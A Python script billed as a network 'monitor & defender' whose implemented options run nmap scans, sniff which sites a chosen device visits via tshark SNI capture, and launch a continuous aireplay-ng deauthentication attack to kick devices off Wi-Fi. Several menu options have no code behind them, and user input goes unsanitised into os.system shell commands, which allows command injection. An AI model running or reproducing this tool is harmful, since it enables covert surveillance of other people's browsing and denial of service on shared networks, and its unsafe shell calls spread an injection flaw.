import nmap
import socket
import os
import subprocess

# Initialize Nmap
scanner = nmap.PortScanner()

def get_header():
    return "="*60 + "\n IZEMA 816 - THE ULTIMATE NETWORK MONITOR & DEFENDER \n" + "="*60

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

clear_screen()
print(get_header())

ip_addr = input("\nEnter Main Gateway IP (e.g., 192.168.1.1): ")

menu = """
1) SYN ACK Scan (Fast/Stealth)
2) UDP Scan (Find hidden services)
3) Comprehensive Scan (Versions & Vulnerabilities)
4) Network Sweep (Find every device on Wi-Fi)
5) Extract Device Names (DNS Reverse Lookup)
6) Public Domain History (Whois/External)
7) LIVE History Sniffer (Watch website requests)
8) Data Detective (Find who is watching Reels/Videos)
9) Targeted Deep Detective (Detailed Domains/SNI)
10) Deauth Kick (Kick a device off Wi-Fi)
11) Vendor Lookup (Identify Device Manufacturer)
12) Exit
"""

while True:
    print("\n" + "-"*30)
    print(menu)
    resp = input("Select an option: ").lower().strip()

    if resp == "1" or "syn" in resp:
        print(f"\n[*] Scanning {ip_addr}...")
        scanner.scan(ip_addr, "1-1024", "-v -sS")
        if ip_addr in scanner.all_hosts():
            print(f"Ports: {list(scanner[ip_addr]['tcp'].keys()) if 'tcp' in scanner[ip_addr] else 'None'}")

    elif resp == "4" or "sweep" in resp:
        print("\n[*] Scanning entire local network...")
        base_net = ".".join(ip_addr.split(".")[:-1]) + ".0/24"
        scanner.scan(hosts=base_net, arguments='-sn')
        for host in scanner.all_hosts():
            print(f"Found: {host: <15} | Name: {scanner[host].hostname()}")

    elif resp == "9" or "watch" in resp:
        target = input(f"Enter IP to watch [Default {ip_addr}]: ")
        target_to_watch = target if target else ip_addr
        print(f"\n[*] DEEP DETECTIVE: Catching detailed hostnames for {target_to_watch}...")
        print("[*] (Capturing SNI and HTTP Hosts - Press Ctrl+C to stop)")
        
        # This TShark command pulls the specific server names even inside HTTPS handshakes
        cmd = (f"sudo tshark -i any -f 'host {target_to_watch}' -l -T fields "
               f"-e tls.handshake.extensions_server_name -e http.host "
               f"-Y 'tls.handshake.extensions_server_name or http.host'")
        
        try:
            os.system(cmd)
        except KeyboardInterrupt:
            print("\nStopping Deep Dive...")

    elif resp == "10" or "kick" in resp:
        target_mac = input("Enter Target Device MAC: ")
        router_mac = input("Enter Router MAC: ")
        interface = input("Enter Wi-Fi Interface (wlan0mon): ")
        print(f"[*] Sending continuous Deauth... Ctrl+C to stop.")
        os.system(f"sudo aireplay-ng -0 0 -a {router_mac} -c {target_mac} {interface}")

    elif resp == "12" or "exit" in resp:
        print("Powering down.")
        break